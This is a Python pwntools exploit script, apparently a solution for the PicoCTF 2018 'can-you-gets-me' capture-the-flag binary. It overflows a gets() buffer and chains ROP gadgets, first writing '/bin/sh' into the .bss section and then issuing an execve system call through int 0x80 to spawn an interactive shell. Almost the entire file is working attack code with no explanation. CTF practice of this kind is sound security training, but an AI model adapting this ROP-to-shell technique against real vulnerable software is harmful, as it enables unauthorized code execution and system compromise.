#coding=utf-8
from pwn import *

context.arch = 'i386' # CPU平台
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h'] # tmux调试窗口

elf = ELF('./PicoCTF_2018_can-you-gets-me')
# libc = ELF('./lib/i386-linux-gnu/libc-2.23.so')
# libc = ELF('./lib/x86_64-linux-gnu/libc-2.23.so')

int80 = 0x0806cc25 #: int 0x80
peax = 0x080b81c6 #: pop eax ; ret
pebx = 0x080481c9 #: pop ebx ; ret
pppr = 0x0806f050 #: pop edx ; pop ecx ; pop ebx ; ret
gets = 0x0804F120
bss = elf.get_section_by_name('.bss').header.sh_addr+0x500
log.success(hex(bss))
main = 0x080488A3

io = process('./PicoCTF_2018_can-you-gets-me')


io.recvuntil('GIVE ME YOUR NAME!\n')
payload = b'a'*24 + b'bbbb'
payload += p32(gets) + p32(main) + p32(bss)
io.sendline(payload)

io.sendline('/bin/sh\x00')

io.recvuntil('GIVE ME YOUR NAME!\n')
payload = b'a'*24 + b'bbbb'
payload += p32(pppr) + p32(0) + p32(0) + p32(bss)
payload += p32(peax) + p32(0xb)
payload += p32(int80)
io.sendline(payload)


io.interactive()
